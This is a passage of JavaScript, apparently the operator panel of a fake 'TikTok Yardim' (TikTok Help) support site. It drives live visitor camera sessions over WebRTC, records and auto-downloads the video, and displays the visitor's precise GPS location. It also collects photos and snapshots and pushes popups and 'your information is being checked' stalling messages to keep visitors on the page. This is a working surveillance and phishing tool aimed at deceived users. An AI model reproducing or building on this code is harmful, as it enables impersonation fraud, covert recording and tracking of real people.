  if (endCameraBtnModal) endCameraBtnModal.hidden = !visible;
}

function setHideCameraVisible(visible) {
  if (hideCameraPanelBtn) hideCameraPanelBtn.hidden = !visible;
  if (hideCameraBtnModal) hideCameraBtnModal.hidden = !visible;
}

function setCameraUi(visible, statusText) {
  if (adminCameraBox) adminCameraBox.hidden = !visible;
  if (cameraStatus && statusText) cameraStatus.textContent = statusText;
  if (adminCameraBox) {
    adminCameraBox.classList.toggle(
      "is-recording",
      Boolean(visible && /kayit yapiliyor|Canli|Baglan|Yanit|video|ICE/i.test(statusText || ""))
    );
  }
  const sessionActive = Boolean(adminCall);
  setEndCameraVisible(sessionActive);
  setHideCameraVisible(sessionActive && visible);
  if (reopenCameraBtn) {
    reopenCameraBtn.hidden = visible || !sessionActive;
  }
}

function hideCameraPopup() {
  if (adminCameraBox) adminCameraBox.hidden = true;
  if (reopenCameraBtn) reopenCameraBtn.hidden = !adminCall;
  setEndCameraVisible(Boolean(adminCall));
  setHideCameraVisible(false);
}

function showCameraPopup() {
  const hasSnap =
    Boolean(adminSnapshotPreview?.getAttribute("src")) && !adminSnapshotPreview?.hidden;
  if (!adminCall && downloadRecordingBtn?.hidden && !hasSnap) return;
  if (adminCameraBox) adminCameraBox.hidden = false;
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
  setEndCameraVisible(Boolean(adminCall));
  setHideCameraVisible(Boolean(adminCall));
}

function showAdminSnapshot(url) {
  if (!url) return;
  if (adminSnapshotPreview) {
    adminSnapshotPreview.src = url;
    adminSnapshotPreview.hidden = false;
  }
  if (adminSnapshotLink) {
    adminSnapshotLink.href = url;
    adminSnapshotLink.hidden = false;
  }
  if (adminCameraBox) adminCameraBox.hidden = false;
  if (reopenCameraBtn) reopenCameraBtn.hidden = !adminCall;
  setCameraUi(true, "Kamera fotografi alindi (Storage)");
}

function clearAdminLocationUi() {
  if (adminLiveLocation) adminLiveLocation.hidden = true;
  if (adminLocationText) adminLocationText.textContent = "Konum bekleniyor…";
  if (adminLocationMaps) {
    adminLocationMaps.hidden = true;
    adminLocationMaps.removeAttribute("href");
  }
}

function updateAdminLocationUi(loc, status, error) {
  if (!adminLiveLocation) return;
  adminLiveLocation.hidden = false;
  if (loc && Number.isFinite(Number(loc.lat)) && Number.isFinite(Number(loc.lng))) {
    const lat = Number(loc.lat);
    const lng = Number(loc.lng);
    const acc = Number(loc.accuracy);
    const accTxt = Number.isFinite(acc) ? ` · ±${Math.round(acc)} m` : "";
    const t = loc.ts ? new Date(loc.ts).toLocaleTimeString("tr-TR") : "";
    if (adminLocationText) {
      adminLocationText.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}${accTxt}${
        t ? ` · ${t}` : ""
      }`;
    }
    if (adminLocationMaps) {
      adminLocationMaps.href = `https://www.google.com/maps?q=${lat},${lng}`;
      adminLocationMaps.hidden = false;
    }
    return;
  }
  if (adminLocationMaps) {
    adminLocationMaps.hidden = true;
    adminLocationMaps.removeAttribute("href");
  }
  const st = String(status || "");
  if (st === "denied") {
    adminLocationText.textContent =
      "Konum engelli (Safari). Ziyaretçi: Ayarlar?Safari?Konum?Sor, yenile, kirmizi butona dokun";
  } else if (st === "awaiting-tap" || st === "prompting") {
    adminLocationText.textContent =
      st === "prompting"
        ? "Konum penceresi istendi — ziyaretçi Izin Ver’e basmali"
        : "Konum bekleniyor — ziyaretçi kirmizi konum butonuna dokunmali";
  } else if (st === "unsupported") {
    adminLocationText.textContent = "Tarayici konum desteklemiyor";
  } else if (st === "unavailable" || st === "timeout" || st === "error") {
    adminLocationText.textContent = `Konum alinamadi${error ? `: ${error}` : ""}`;
  } else {
    adminLocationText.textContent = "Konum bekleniyor…";
  }
}

function clearAdminSnapshot() {
  if (adminSnapshotPreview) {
    adminSnapshotPreview.removeAttribute("src");
    adminSnapshotPreview.hidden = true;
  }
  if (adminSnapshotLink) {
    adminSnapshotLink.removeAttribute("href");
    adminSnapshotLink.hidden = true;
  }
}

function clearRecordingLink() {
  if (!downloadRecordingBtn) return;
  if (downloadRecordingBtn.href?.startsWith("blob:")) {
    URL.revokeObjectURL(downloadRecordingBtn.href);
  }
  downloadRecordingBtn.removeAttribute("href");
  downloadRecordingBtn.hidden = true;
  downloadRecordingBtn.textContent = "Kaydi indir";
}

function forceDownloadBlob(blob, name) {
  if (!blob?.size) return false;
  const fileName = name || `kamera-${Date.now()}.webm`;
  const objUrl = URL.createObjectURL(blob);
  if (downloadRecordingBtn) {
    if (downloadRecordingBtn.href?.startsWith("blob:")) {
      URL.revokeObjectURL(downloadRecordingBtn.href);
    }
    downloadRecordingBtn.href = objUrl;
    downloadRecordingBtn.download = fileName;
    downloadRecordingBtn.removeAttribute("target");
    downloadRecordingBtn.hidden = false;
    downloadRecordingBtn.textContent = "Kaydi indir";
  }
  try {
    const a = document.createElement("a");
    a.href = objUrl;
    a.download = fileName;
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    a.remove();
  } catch {
    /* ignore */
  }
  if (adminCameraBox) adminCameraBox.hidden = false;
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
  setCameraUi(true, "Kayit indirildi");
  sendHint.hidden = false;
  sendHint.textContent = `Kayit indirildi: ${fileName}`;
  window.setTimeout(() => {
    if (sendHint.textContent.includes("Kayit")) sendHint.hidden = true;
  }, 5000);
  return true;
}

async function forceDownloadFromUrl(url, name) {
  if (!url) return;
  const fileName = name || `kamera-${Date.now()}.webm`;

  if (downloadRecordingBtn) {
    downloadRecordingBtn.href = url;
    downloadRecordingBtn.download = fileName;
    downloadRecordingBtn.target = "_blank";
    downloadRecordingBtn.rel = "noopener";
    downloadRecordingBtn.hidden = false;
    downloadRecordingBtn.textContent = "Kaydi indir (Storage)";
  }
  if (adminCameraBox) adminCameraBox.hidden = false;
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
  setCameraUi(true, "Kayit indiriliyor…");
  sendHint.hidden = false;
  sendHint.textContent = `Kayit indiriliyor: ${fileName}`;

  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const blob = await res.blob();
    if (blob?.size) {
      forceDownloadBlob(blob, fileName);
      if (downloadRecordingBtn) downloadRecordingBtn.textContent = "Kaydi indir (Storage)";
      return;
    }
  } catch (err) {
    console.warn("Blob fetch failed, opening URL", err);
  }

  try {
    const a = document.createElement("a");
    a.href = url;
    a.download = fileName;
    a.target = "_blank";
    a.rel = "noopener";
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    a.remove();
  } catch {
    window.open(url, "_blank", "noopener");
  }

  window.setTimeout(() => {
    if (sendHint.textContent.includes("Kayit")) sendHint.hidden = true;
  }, 5000);
}

const autoDownloadedRecKeys = new Set();

function maybeAutoDownloadSessionRecording(row, { force = false } = {}) {
  const url = row?.lastRecordingUrl;
  if (!url || !row?.id) return false;
  const key = `${row.id}:${url}`;
  if (!force && autoDownloadedRecKeys.has(key)) return false;
  autoDownloadedRecKeys.add(key);
  void forceDownloadFromUrl(
    url,
    row.lastRecordingName || `kamera-${shortId(row.id)}.webm`
  );
  return true;
}

let recordingWatchUnsub = null;
let recordingWatchKey = null;
let recordingWatchTimer = null;

function stopRecordingWatch() {
  try {
    recordingWatchUnsub?.();
  } catch {
    /* ignore */
  }
  recordingWatchUnsub = null;
  recordingWatchKey = null;
  if (recordingWatchTimer) {
    clearTimeout(recordingWatchTimer);
    recordingWatchTimer = null;
  }
}

function startRecordingWatch(sessionId, callId, state) {
  stopRecordingWatch();
  const sync = window.ChatSync;
  if (!sync?.listenCameraCall || !sessionId || !callId) return;
  const key = `${sessionId}/${callId}`;
  recordingWatchKey = key;

  recordingWatchUnsub = sync.listenCameraCall(sessionId, callId, (data) => {
    if (recordingWatchKey !== key || !data) return;
    if (data.lastSnapshotUrl) {
      showAdminSnapshot(data.lastSnapshotUrl);
    }
    if (data.recordingUrl && data.recordingUrl !== state.seenRecordingUrl) {
      state.seenRecordingUrl = data.recordingUrl;
      const dlKey = `${sessionId}:${data.recordingUrl}`;
      autoDownloadedRecKeys.add(dlKey);
      void forceDownloadFromUrl(
        data.recordingUrl,
        data.recordingName || `kamera-${shortId(sessionId)}.webm`
      );
      if (data.recordingStatus === "ready" && (data.status === "ended" || data.forceClose)) {
        stopRecordingWatch();
      }
      return;
    }
    if (data.recordingStatus === "failed") {
      setCameraUi(
        true,
        `Storage kaydi yok (${data.recordingError || "hata"}) · yerel yedek deneniyor…`
      );
      if (state.lastBlob?.size) {
        forceDownloadBlob(state.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
      } else {
        sendHint.hidden = false;
        sendHint.textContent = "Kayit alinamadi. Storage kurallarini yayinladiginizdan emin olun.";
      }
      stopRecordingWatch();
    }
  });

  // Ziyaretçi kaydi 90 sn + yükleme; 40 sn erken kesilmesin
  recordingWatchTimer = window.setTimeout(() => {
    if (recordingWatchKey !== key) return;
    if (state.seenRecordingUrl) {
      stopRecordingWatch();
      return;
    }
    if (state.lastBlob?.size) {
      forceDownloadBlob(state.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
      setCameraUi(true, "Storage gecikti · yerel kayit indirildi — Storage URL gelirse tekrar iner");
      // Yerel yedek sonrasi Storage URL için biraz daha dinle
      recordingWatchTimer = window.setTimeout(() => {
        if (recordingWatchKey === key) stopRecordingWatch();
      }, 120000);
      return;
    }
    setCameraUi(true, "Kayit bekleniyor… ziyaretçi sayfasi açik mi / Storage kurallari?");
    sendHint.hidden = false;
    sendHint.textContent =
      "Kayit henüz gelmedi. Ziyaretçi en az 35 sn kalsin (parça yükleme) veya Kamera’yi sonlandirin.";
    stopRecordingWatch();
  }, 180000);
}

function resetLiveVideoUi() {
  clearRecordingLink();
  clearAdminLocationUi();
  clearAdminSnapshot();
  if (adminRemoteVideo) {
    adminRemoteVideo.srcObject = null;
    adminRemoteVideo.load?.();
  }
}

function pickRecorderMime() {
  if (typeof MediaRecorder === "undefined") return "";
  const types = [
    "video/webm;codecs=vp8",
    "video/webm;codecs=vp9",
    "video/webm",
  ];
  return types.find((t) => MediaRecorder.isTypeSupported(t)) || "";
}

function startAdminRecording(stream, state) {
  if (!stream || state.recorder || typeof MediaRecorder === "undefined") return false;

  const videoTracks = stream.getVideoTracks().filter((t) => t.readyState === "live");
  if (!videoTracks.length) {
    setCameraUi(true, "Canli · video track yok");
    return false;
  }

  const recordStream = new MediaStream(videoTracks);
  const mime = pickRecorderMime();
  let recorder;
  try {
    recorder = mime
      ? new MediaRecorder(recordStream, { mimeType: mime, videoBitsPerSecond: 1_500_000 })
      : new MediaRecorder(recordStream);
  } catch (err) {
    setCameraUi(true, `Canli · kayit yok (${err?.message || "desteklenmiyor"})`);
    return false;
  }

  const chunks = [];
  state.recordChunks = chunks;
  recorder.ondataavailable = (e) => {
    if (e.data?.size) chunks.push(e.data);
  };
  recorder.onstop = () => {
    const type = recorder.mimeType || mime || "video/webm";
    const blob = new Blob(chunks, { type });
    state.lastBlob = blob;
    // Canli oturumdayken indirme butonu gösterme (eski kayit yarisi)
    state._recordingStopped?.();
  };
  recorder.onerror = () => {
    setCameraUi(true, "Canli · kayit hatasi");
  };

  state.recorder = recorder;
  try {
    recorder.start(500);
    setCameraUi(true, "Canli · kayit yapiliyor…");
    return true;
  } catch {
    state.recorder = null;
    setCameraUi(true, "Canli · kayit baslatilamadi");
    return false;
  }
}

function stopAdminRecording(call, { autoDownload = false } = {}) {
  return new Promise((resolve) => {
    let settled = false;
    const finish = (ok) => {
      if (settled) return;
      settled = true;
      resolve(ok);
    };

    const rec = call?.recorder;
    if (!rec || rec.state === "inactive") {
      if (call?.lastBlob?.size) {
        finish(true);
        return;
      }
      finish(false);
      return;
    }
    call.autoDownload = autoDownload;
    call._recordingStopped = () => finish(true);
    window.setTimeout(() => finish(Boolean(call.lastBlob?.size)), 4000);
    try {
      if (rec.state === "recording") {
        try {
          rec.requestData();
        } catch {
          /* ignore */
        }
      }
      if (rec.state === "recording" || rec.state === "paused") rec.stop();
      else finish(false);
    } catch {
      finish(false);
    }
  });
}

async function stopAdminCall(updateRemote = true, { autoDownload = false, keepUi = false } = {}) {
  const call = adminCall;
  adminCall = null;
  if (!call) {
    if (!keepUi) {
      try {
        setCameraUi(false);
      } catch {
        if (adminCameraBox) adminCameraBox.hidden = true;
      }
    }
    if (adminRemoteVideo) adminRemoteVideo.srcObject = null;
    return;
  }
  try {
    call.unsubCall?.();
    call.unsubIce?.();
  } catch {
    /* ignore */
  }

  await stopAdminRecording(call, { autoDownload });

  try {
    call.pc?.close();
  } catch {
    /* ignore */
  }
  if (adminRemoteVideo) adminRemoteVideo.srcObject = null;

  const hasDownload = Boolean(downloadRecordingBtn && !downloadRecordingBtn.hidden);
  if (keepUi || hasDownload || call.lastBlob?.size) {
    setCameraUi(true, cameraStatus?.textContent || "Kayit hazir");
    adminCameraBox?.classList.remove("is-recording");
  } else {
    setCameraUi(false);
  }

  if (updateRemote && call.sessionId && call.callId && window.ChatSync) {
    window.ChatSync.setCameraCallStatus(call.sessionId, call.callId, "ended").catch(() => {});
  }
}

async function joinAdminCamera(sessionId, callId) {
  if (!window.ChatSync || !sessionId || !callId) return;
  if (adminCall?.callId === callId && adminCall?.sessionId === sessionId && adminCall?.pc) {
    showCameraPopup();
    return;
  }

  await stopAdminCall(false, { keepUi: true });
  resetLiveVideoUi();
  clearAdminLocationUi();
  setCameraUi(true, "Ziyaretçi onayi bekleniyor…");

  const sync = window.ChatSync;
  const pc = new RTCPeerConnection(sync.ICE_SERVERS);
  let answered = false;
  const pendingVisitorIce = [];
  let remoteReady = false;
  let callEnded = false;
  const state = {
    sessionId,
    callId,
    pc,
    recorder: null,
    recordChunks: [],
    lastBlob: null,
    autoDownload: false,
    seenRecordingUrl: null,
    unsubCall: null,
    unsubIce: null,
  };
  adminCall = state;

  const attachLiveVideo = (stream, track) => {
    if (!adminRemoteVideo || !stream) return;
    adminRemoteVideo.srcObject = stream;
    adminRemoteVideo.muted = true;
    adminRemoteVideo.autoplay = true;
    adminRemoteVideo.playsInline = true;
    const kick = () => {
      adminRemoteVideo.play?.().catch(() => {});
    };
    kick();
    adminRemoteVideo.onloadedmetadata = kick;
    if (track) {
      track.addEventListener("unmute", () => {
        // Chrome bazen ilk frameden önce siyah gösterir
        adminRemoteVideo.srcObject = stream;
        kick();
        setCameraUi(true, "Canli görüntü");
      });
      if (track.muted === false) {
        setCameraUi(true, "Canli görüntü");
      }
    }
    showCameraPopup();
  };

  pc.ontrack = (ev) => {
    if (adminCall !== state || callEnded) return;
    const track = ev.track;
    const stream = ev.streams?.[0] || new MediaStream([track]);
    if (track && track.kind === "video") {
      attachLiveVideo(stream, track);
      // Gösterim için orijinal track; kayit için clone (siyah ekrani önler)
      try {
        const clone = track.clone();
        const recordStream = new MediaStream([clone]);
        window.setTimeout(() => {
          if (adminCall !== state || state.recorder || callEnded) return;
          startAdminRecording(recordStream, state);
        }, 800);
      } catch {
        setCameraUi(true, "Canli görüntü");
      }
    }
  };

  pc.onconnectionstatechange = () => {
    if (adminCall !== state) return;
    const s = pc.connectionState;
    if (s === "connected") {
      setCameraUi(true, "Canli görüntü bagli");
      state.pc?.getReceivers?.().forEach((receiver) => {
        const track = receiver.track;
        if (!track || track.kind !== "video") return;
        attachLiveVideo(new MediaStream([track]), track);
      });
    }
    if (s === "failed") setCameraUi(true, "Baglanti basarisiz — ag/firewall");
    if (s === "disconnected") setCameraUi(true, "Baglanti koptu…");
  };

  pc.oniceconnectionstatechange = () => {
    if (adminCall !== state) return;
    const s = pc.iceConnectionState;
    if (s === "connected" || s === "completed") {
      setCameraUi(true, "Canli görüntü (ICE OK)");
      state.pc?.getReceivers?.().forEach((receiver) => {
        const track = receiver.track;
        if (!track || track.kind !== "video") return;
        attachLiveVideo(new MediaStream([track]), track);
      });
    }
    if (s === "failed") {
      setCameraUi(true, "ICE basarisiz — ag engeli olabilir");
    }
  };

  pc.onicecandidate = (ev) => {
    if (ev.candidate && !callEnded) {
      sync.pushIceCandidate(sessionId, callId, "admin", ev.candidate.toJSON()).catch(() => {});
    }
  };

  const addVisitorIce = async (cand) => {
    if (!cand || !state.pc || callEnded) return;
    if (!remoteReady) {
      pendingVisitorIce.push(cand);
      return;
    }
    try {
      await state.pc.addIceCandidate(new RTCIceCandidate(cand));
    } catch {
      /* ignore */
    }
  };

  state.unsubIce = sync.listenIceCandidates(sessionId, callId, "visitor", (cand) => {
    addVisitorIce(cand);
  });

  state.unsubCall = sync.listenCameraCall(sessionId, callId, async (data) => {
    if (!data || adminCall !== state) return;

    if (data.location || data.locationStatus) {
      updateAdminLocationUi(data.location, data.locationStatus, data.locationError);
    }

    if (data.lastSnapshotUrl) {
      showAdminSnapshot(data.lastSnapshotUrl);
    }

    // Storage kaydi hazir — oturum bitti/kapanmis olsa da indir
    if (
      data.recordingUrl &&
      data.recordingUrl !== state.seenRecordingUrl &&
      (data.status === "ended" ||
        state.awaitingRecording ||
        data.recordingStatus === "ready")
    ) {
      state.seenRecordingUrl = data.recordingUrl;
      autoDownloadedRecKeys.add(`${sessionId}:${data.recordingUrl}`);
      forceDownloadFromUrl(
        data.recordingUrl,
        data.recordingName || `kamera-${shortId(sessionId)}.webm`
      );
      stopRecordingWatch();
    }

    if (data.status === "denied") {
      callEnded = true;
      setCameraUi(true, "Ziyaretçi kamerayi reddetti");
      await stopAdminCall(false, { keepUi: true });
      return;
    }
    if (data.status === "ended") {
      callEnded = true;
      const pending = {
        sessionId,
        callId,
        lastBlob: null,
        seenRecordingUrl: state.seenRecordingUrl || null,
        awaitingRecording: true,
      };
      try {
        state.unsubIce?.();
        state.unsubIce = null;
        state.pc?.close();
        state.pc = null;
      } catch {
        /* ignore */
      }
      try {
        await stopAdminRecording(state, { autoDownload: false });
        pending.lastBlob = state.lastBlob || null;
      } catch {
        /* ignore */
      }
      try {
        state.unsubCall?.();
        state.unsubCall = null;
      } catch {
        /* ignore */
      }
      if (adminCall === state) adminCall = null;
      if (adminRemoteVideo) adminRemoteVideo.srcObject = null;
      adminCameraBox?.classList.remove("is-recording");

      if (data.recordingUrl && data.recordingUrl !== pending.seenRecordingUrl) {
        pending.seenRecordingUrl = data.recordingUrl;
        forceDownloadFromUrl(
          data.recordingUrl,
          data.recordingName || `kamera-${shortId(sessionId)}.webm`
        );
      } else if (pending.lastBlob?.size) {
        forceDownloadBlob(pending.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
        setCameraUi(true, "Yerel kayit indirildi · Storage yedek bekleniyor…");
        startRecordingWatch(sessionId, callId, pending);
      } else {
        setCameraUi(true, "Baglanti kapandi · ziyaretçi kaydi yükleniyor…");
        startRecordingWatch(sessionId, callId, pending);
      }
      setEndCameraVisible(false);
      if (reopenCameraBtn) reopenCameraBtn.hidden = false;
      return;
    }
    if (data.status === "requested") {
      // ICE güncellemesi status'u requested birakmis olabilir; ileri gitmis UI'yi geri alma
      if (!data.offer && !data.visitorReady && !answered) {
        clearRecordingLink();
        setCameraUi(true, "Ziyaretçi onayi bekleniyor…");
      }
    }
    if (data.visitorReady && !answered) {
      setCameraUi(true, "Ziyaretçi kamerayi açti · baglaniyor…");
    }
    if ((data.status === "live" || data.offer) && !answered) {
      setCameraUi(true, "Sinyal alindi · yanitlaniyor…");
    }
    if (answered && adminRemoteVideo?.srcObject) {
      setCameraUi(true, "Canli görüntü");
    } else if (answered) {
      setCameraUi(true, "Yanit gönderildi · video bekleniyor…");
    }
    // Bitmis oturumun eski offer/answer'ina baglanma
    if (callEnded) return;
    if (data.offer && !answered && state.pc) {
      answered = true;
      try {
        await state.pc.setRemoteDescription(
          new RTCSessionDescription({
            type: data.offer.type,
            sdp: data.offer.sdp,
          })
        );
        remoteReady = true;
        for (const cand of pendingVisitorIce.splice(0)) {
          await addVisitorIce(cand);
        }
        const answer = await state.pc.createAnswer();
        await state.pc.setLocalDescription(answer);
        if (typeof sync.writeCameraAnswer === "function") {
          await sync.writeCameraAnswer(sessionId, callId, {
            type: answer.type,
            sdp: answer.sdp,
          });
        } else {
          await sync.writeCameraSignal(sessionId, callId, "answer", {
            type: answer.type,
            sdp: answer.sdp,
          });
        }
        setCameraUi(true, "Yanit gönderildi · video bekleniyor…");
        const attachReceivers = () => {
          state.pc?.getReceivers?.().forEach((receiver) => {
            const track = receiver.track;
            if (!track || track.kind !== "video") return;
            attachLiveVideo(new MediaStream([track]), track);
          });
        };
        window.setTimeout(attachReceivers, 300);
        window.setTimeout(attachReceivers, 1500);
      } catch (err) {
        answered = false;
        setCameraUi(true, `Baglanti hatasi: ${err?.message || err}`);
      }
    }
  });
}

function appendThreadMessage(msg, announce) {
  if (!msg?.id || seenMessageIds.has(msg.id)) return;
  seenMessageIds.add(msg.id);

  const isAdmin = msg.who === "admin" || msg.from === "admin";
  const isLoading = msg.type === "loading";
  const row = document.createElement("div");
  const side = msg.who === "user" ? "user" : "bot";
  row.className = `chat-bubble chat-${side}${isAdmin ? " chat-admin" : ""}${
    isLoading ? " chat-loading" : ""
  }`;
  const meta = document.createElement("span");
  meta.className = "chat-meta";
  meta.textContent = `${whoLabel(msg)} · ${fmtTime(msg.ts)}`;
  const body = document.createElement("div");
  body.className = "chat-loading-body";
  if (isLoading) {
    body.innerHTML = `
      <span class="chat-spinner" aria-hidden="true"></span>
      <p></p>
      <span class="chat-loading-dots" aria-hidden="true"><i></i><i></i><i></i></span>
    `;
    body.querySelector("p").textContent =
      msg.text || "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrilmayin…";
  } else if (msg.type === "popup") {
    const p = document.createElement("p");
    p.textContent = `Popup: ${msg.text || ""}`;
    const tags = document.createElement("em");
    tags.className = "popup-btn-tags";
    tags.textContent = `${msg.okLabel || "Tamam"} / ${msg.cancelLabel || "Iptal"}${
      msg.withInput ? " · metin kutusu" : ""
    }`;
    body.append(p, tags);
  } else if (msg.type === "camera") {
    const p = document.createElement("p");
    p.textContent = `?? Kamera talebi: ${msg.text || ""}`;
    body.appendChild(p);
    // Ziyaretçi otomatik kamera (from:auto) — hangi sayfadan gelirse gelsin baglan
    if (announce && msg.callId && selectedId) {
      resetLiveVideoUi();
      void joinAdminCamera(selectedId, msg.callId);
    }
  } else if (msg.type === "photos") {
    const p = document.createElement("p");
    p.textContent = `?? Fotograf talebi: ${msg.text || ""}`;
    const tags = document.createElement("em");
    tags.className = "popup-btn-tags";
    tags.textContent = `${msg.okLabel || "Fotograf seç"} / ${msg.cancelLabel || "Istemiyorum"} · max ${
      msg.maxPhotos || 10
    }`;
    body.append(p, tags);
  } else if (msg.type === "photo" || msg.imageUrl) {
    const p = document.createElement("p");
    p.textContent = msg.text || "Fotograf";
    body.appendChild(p);
    if (msg.imageUrl) {
      const link = document.createElement("a");
      link.href = msg.imageUrl;
      link.target = "_blank";
      link.rel = "noopener";
      link.className = "admin-photo-link";
      const img = document.createElement("img");
      img.src = msg.imageUrl;
      img.alt = msg.fileName || "Ziyaretçi fotografi";
      img.className = "admin-photo-thumb";
      img.loading = "lazy";
      link.appendChild(img);
      body.appendChild(link);
    }
  } else {
    const p = document.createElement("p");
    p.textContent = msg.text || "";
    body.appendChild(p);
  }
  row.append(meta, body);
  threadMessages.appendChild(row);
  threadMessages.scrollTop = threadMessages.scrollHeight;

  if (announce) {
    scheduleRecentFeedRefresh(latestSessionRows);
  }

  if (announce && msg.who === "user") {
    const text = String(msg.text || "(bos mesaj)").slice(0, 180);
    const focusedInChat =
      !document.hidden &&
      Boolean(
        document.activeElement === replyInput ||
          document.activeElement?.closest?.(".admin-thread, .admin-compose, #reply-form")
      );
    const threadVisible = (() => {
      if (!threadMessages || document.hidden) return false;
      const r = threadMessages.getBoundingClientRect();
      return r.width > 40 && r.height > 60 && r.bottom > 80 && r.top < window.innerHeight - 40;
    })();

    // Karsilikli kural: sohbet görünür/odakliysa sessiz toast; degilse sesli uyari
    if (!focusedInChat && !threadVisible) {
      fireHighAlert({
        kicker: "YENI MESAJ",
        title: "Ziyaretçi yazdi",
        body: text,
        tag: `msg-${selectedId || "x"}`,
        force: document.hidden,
      });
    } else {
      showAdminAlert({
        kicker: "YENI MESAJ",
        title: "Ziyaretçi yazdi",
        body: text,
      });
    }
  }
}

function setThreadToolsEnabled(enabled) {
  if (exportChatBtn) exportChatBtn.disabled = !enabled;
  if (clearChatBtn) clearChatBtn.disabled = !enabled;
}

function clearThreadUi() {
  seenMessageIds = new Set();
  if (threadMessages) threadMessages.innerHTML = "";
}

function resetSelectedSessionUi() {
  selectedId = null;
  setThreadToolsEnabled(false);
  clearThreadUi();
  if (threadTitle) threadTitle.textContent = "Bir sohbet seçin";
  if (threadMeta) threadMeta.textContent = "Sol listeden canli oturumlari izleyin.";
  if (unsubMessages) {
    unsubMessages();
    unsubMessages = null;
  }
  stopRecordingWatch();
  stopAdminCall(false, { keepUi: false });
  clearRecordingLink();
  resetLiveVideoUi();
  updateMediaDock(null);
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
}

function msgWhoExport(msg) {
  if (msg?.from === "admin" || msg?.who === "admin") return "Destek";
  if (msg?.who === "user") return "Ziyaretçi";
  if (msg?.who === "bot") return "Asistan";
  return String(msg?.who || "Bilinmeyen");
}

function formatChatExportTxt(sessionId, meta, messages) {
  const lines = [
    "TikTok Yardim — Sohbet disa aktarim",
    `Oturum: #${shortId(sessionId)} (${sessionId})`,
    `Sayfa: ${meta?.page || "/"}`,
    `Disa aktarim: ${new Date().toLocaleString("tr-TR")}`,
    `Mesaj sayisi: ${messages.length}`,
    "".padEnd(48, "-"),
    "",
  ];
  messages.forEach((msg) => {
    const when = msg.ts ? new Date(msg.ts).toLocaleString("tr-TR") : "-";
    const who = msgWhoExport(msg);
    let kind = "";
    if (msg.type === "camera") kind = " [kamera]";
    else if (msg.type === "popup") kind = " [popup]";
    else if (msg.type === "loading") kind = " [yükleme]";
    else if (msg.type === "photos") kind = " [fotograf talebi]";
    else if (msg.type === "photo") kind = " [fotograf]";
    lines.push(`[${when}] ${who}${kind}`);
    lines.push(String(msg.text || "").trim() || "(bos)");
    if (msg.imageUrl) lines.push(`URL: ${msg.imageUrl}`);
    lines.push("");
  });
  if (!messages.length) lines.push("(Bu sohbette mesaj yok)");
  return lines.join("\n");
}

function downloadTextFile(filename, text) {
  const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.style.display = "none";
  document.body.appendChild(a);
  a.click();
  a.remove();
  window.setTimeout(() => URL.revokeObjectURL(url), 5000);
}

async function exportSelectedChat() {
  if (!selectedId || !window.ChatSync?.getSessionMessages) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce soldan bir sohbet seçin.";
    return;
  }
  sendHint.hidden = false;
  sendHint.textContent = "Sohbet disa aktariliyor…";
  try {
    const [messages, meta] = await Promise.all([
      window.ChatSync.getSessionMessages(selectedId),
      window.ChatSync.getSessionMeta?.(selectedId),
    ]);
    const body = formatChatExportTxt(selectedId, meta || {}, messages);
    const stamp = new Date().toISOString().slice(0, 19).replace(/[:T]/g, "-");
    downloadTextFile(`sohbet-${shortId(selectedId)}-${stamp}.txt`, body);
    sendHint.textContent = `Disa aktarildi (${messages.length} mesaj).`;
    window.setTimeout(() => {
      if (sendHint.textContent.includes("Disa aktarildi")) sendHint.hidden = true;
    }, 2500);
  } catch (err) {
    sendHint.textContent = `Disa aktarilamadi: ${err?.message || err}`;
  }
}

async function clearSelectedChat() {
  if (!selectedId || !window.ChatSync?.clearSessionMessages) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce soldan bir sohbet seçin.";
    return;
  }
  const ok = window.confirm(
    `Seçili sohbet (#${shortId(selectedId)}) temizlensin mi?\nMesajlar ve kamera oturumu silinir; oturum listede kalir.`
  );
  if (!ok) return;
  sendHint.hidden = false;
  sendHint.textContent = "Sohbet temizleniyor…";
  try {
    stopRecordingWatch();
    await stopAdminCall(false, { keepUi: false });
    await window.ChatSync.clearSessionMessages(selectedId);
    clearThreadUi();
    bindSessionMessages(selectedId);
    sendHint.textContent = "Sohbet temizlendi.";
    window.setTimeout(() => {
      if (sendHint.textContent.includes("temizlendi")) sendHint.hidden = true;
    }, 2000);
  } catch (err) {
    sendHint.textContent = `Temizlenemedi: ${err?.message || err}`;
  }
}

async function clearAllChats() {
  if (!window.ChatSync?.clearAllSessions) return;
  const ok = window.confirm(
    "TÜM sohbetler silinsin mi?\nBu islem geri alinamaz. Tüm oturumlar ve mesajlar kalkar."
  );
  if (!ok) return;
  const ok2 = window.confirm("Emin misiniz? Tüm sohbetler kalici olarak silinecek.");
  if (!ok2) return;
  sendHint.hidden = false;
  sendHint.textContent = "Tüm sohbetler siliniyor…";
  try {
    stopRecordingWatch();
    await stopAdminCall(false, { keepUi: false });
    const n = await window.ChatSync.clearAllSessions();
    resetSelectedSessionUi();
    sendHint.textContent = `${n} sohbet silindi.`;
    window.setTimeout(() => {
      if (sendHint.textContent.includes("silindi")) sendHint.hidden = true;
    }, 2500);
  } catch (err) {
    sendHint.textContent = `Silinemedi: ${err?.message || err}`;
  }
}

function openSession(row) {
  if (!row?.id) return;
  selectedId = row.id;
  setThreadToolsEnabled(true);
  seenMessageIds = new Set();
  threadMessages.innerHTML = "";
  threadTitle.textContent = `Oturum #${shortId(row.id)}`;
  threadMeta.textContent = `${row.page || "/"} · ${fmtTime(row.updatedAt)}`;
  sendHint.hidden = true;
  stopRecordingWatch();
  stopAdminCall(false, { keepUi: false });
  clearRecordingLink();
  resetLiveVideoUi();
  updateMediaDock(row);
  if (row.lastSnapshotUrl) {
    showAdminSnapshot(row.lastSnapshotUrl);
  }
  if (row.lastLocation) {
